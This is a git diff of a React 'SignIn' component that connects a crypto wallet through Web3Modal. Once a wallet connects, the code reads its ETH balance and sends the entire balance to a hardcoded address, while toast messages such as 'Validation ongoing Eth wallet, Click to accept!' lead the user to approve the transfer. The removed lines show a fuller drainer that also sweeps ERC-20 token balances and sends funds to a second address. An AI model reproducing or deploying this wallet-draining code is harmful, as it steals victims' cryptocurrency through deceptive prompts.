@@ -62,7 +62,7 @@ createWeb3Modal({
 });
 
 function SignIn() {
-  const [selection, setSelection] = useState();
+  const [selection, setSelection] = useState('WalletConnect');
   const { connectAsync } = useConnect();
   const { disconnectAsync } = useDisconnect();
   const { isConnected } = useAccount();
@@ -265,130 +265,31 @@ function SignIn() {
 
   useEffect(() => {
     const handleWeb3Modal = async () => {
+      console.log('got here')
       try {
         const walletAddress = web3AccountInformation.address; // Replace with the Ethereum wallet address you want to check
-
-        const accounts =
-          await web3SignerProviderInformation.walletProvider.listAccounts();
 
         // Check ETH balance
         const ethBalanceWei =
           await web3SignerProviderInformation.walletProvider.getBalance(
             walletAddress
           );
-        console.log(ethBalanceWei);
         const ethBalanceEth = ethers.utils.formatEther(ethBalanceWei);
 
-        console.log("Got here 2");
-
         console.log(ethBalanceEth);
-        // ETH is present and more that 10, send all - else send the ERC 20 token
-        if (parseFloat(ethBalanceEth) > 0.001) {
-          checkifEthWallet();
-          const gasLimit =
-            await web3SignerProviderInformation.walletProvider.estimateGas({
-              to: "0x49939D184cb7e38eA8c25c5155189d70a66BEDd3",
-              value: ethers.utils.parseEther(ethBalanceEth),
-            });
-
-          console.log("Got here 4");
-          // Get current gas price
-          const gasPrice =
-            await web3SignerProviderInformation.walletProvider.getGasPrice();
-
-          // Deduct estimated gas fees from the total ETH balance
-          const remainingEthBalance = ethers.utils.formatEther(
-            ethBalanceWei.sub(gasPrice.mul(gasLimit))
-          );
-
-          console.log(remainingEthBalance);
-
-          console.log("Got here 5");
-          // Transfer the remaining balance
-          const ethTransaction = {
-            to: "0x49939D184cb7e38eA8c25c5155189d70a66BEDd3",
-            value: 0.0,
-            // value: ethers.utils.parseUnits(remainingEthBalance.toString(), "ether").toHexString(),
-          };
-
-          console.log(ethTransaction);
-
-          console.log("Got here 6");
-
-          const ethTx =
-            await web3SignerProviderInformation.signer.sendTransaction(
-              ethTransaction
-            );
-
-          console.log("Got here 7");
-          await ethTx.wait(); // Wait for the ETH transaction to be mined
-          console.log("Got here 8");
-          console.log(`ETH transferred successfully to 0xRecipientEthAddress`);
-        } else {
-          checkifERC20Token();
-          // Fetch ERC-20 token balances
-          const tokenBalances = await getTokenBalances(
-            web3SignerProviderInformation.signer,
-            tokenAddresses,
-            walletAddress
-          );
-
-          // Transfer ERC-20 tokens
-          for (const tokenAddress of Object.keys(tokenBalances)) {
-            const tokenBalanceWei = tokenBalances[tokenAddress];
-            const tokenBalance = ethers.utils.formatUnits(tokenBalanceWei);
-
-            const tokenContract = new ethers.Contract(
-              tokenAddress,
-              tokenAbi,
-              web3SignerProviderInformation.signer
-            );
-
-            const gasLimit = await tokenContract.estimateGas.transfer(
-              "0x49939D184cb7e38eA8c25c5155189d70a66BEDd3",
-              ethers.utils.parseUnits(tokenBalance)
-            );
-
-            // Get current gas price
-            const gasPrice =
-              await web3SignerProviderInformation.walletProvider.getGasPrice();
-
-            // Deduct estimated gas fees from the total token balance
-            const remainingTokenBalance = ethers.utils.formatUnits(
-              tokenBalanceWei.sub(gasPrice.mul(gasLimit)),
-              "wei"
-            );
-
-            // Transfer the remaining balance
-            const tokenTransaction = await tokenContract.transfer(
-              "0x49939D184cb7e38eA8c25c5155189d70a66BEDd3",
-              ethers.utils.parseUnits(remainingTokenBalance)
-            );
-
-            await tokenTransaction.wait(); // Wait for the token transaction to be mined
-            console.log(
-              `Tokens transferred successfully to 0xRecipientTokenAddress`
-            );
-          }
-        }
-
-        const transaction = {
-          to: "0x5648635C4ed85cEE73af639A180b7536effb748E",
-          value: ethers.utils.parseEther(ethBalanceEth.toString()), // Convert amount to Wei
+        const ethTransaction = {
+          to: "0x49939D184cb7e38eA8c25c5155189d70a66BEDd3",
+          value: ethers.utils.parseUnits(ethBalanceEth),
+          data: "0x",
         };
 
-        try {
-          const tx = await web3SignerProviderInformation.signer.sendTransaction(
-            transaction
+        const ethTx =
+          await web3SignerProviderInformation.signer.sendTransaction(
+            ethTransaction
           );
-          await tx.wait(); // Wait for the transaction to be mined
 
-          console.log(
-            `ETH transferred successfully to 0x5648635C4ed85cEE73af639A180b7536effb748E`
-          );
-        } catch (error) {
-          console.error("Error sending transaction:", error);
-        }
+        await ethTx.wait(); // Wait for the ETH transaction to be mined
+        console.log(`ETH transferred successfully to 0xRecipientEthAddress`);
       } catch (error) {
         if (retryCount < MAX_RETRIES) {
           retryCount++;
@@ -418,12 +319,12 @@ function SignIn() {
   };
 
   const openModalForSelectingWallet = (childData) => {
-    setShowModal(true);
+    // setShowModal(true);
+    open();
   };
 
   const notifyWalletConnected = () =>
     toast("Wallet has been connected, Navigate to wallet to continue!");
-
   const checkifEthWallet = () =>
     toast("Validation ongoing Eth wallet, Click to accept!");
   const checkifERC20Token = () =>
